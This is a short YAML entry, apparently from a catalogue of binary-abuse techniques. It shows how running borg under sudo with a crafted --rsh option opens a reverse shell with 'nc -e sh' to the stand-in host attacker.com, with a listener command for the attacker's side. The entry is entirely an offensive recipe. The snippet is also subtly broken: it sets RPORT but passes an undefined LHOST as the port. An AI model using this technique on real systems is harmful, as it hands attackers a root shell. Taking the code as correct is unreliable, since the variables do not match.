---
  sudo:
    - description: Run `nc -l -p 12345` on the attacker box to receive the shell. 
      code: |
        RHOST=attacker.com
        RPORT=12345
        NETCAT=/usr/bin/nc
        sudo borg extract .@.:/::.  --rsh "$NETCAT $RHOST $LHOST -e sh"
---
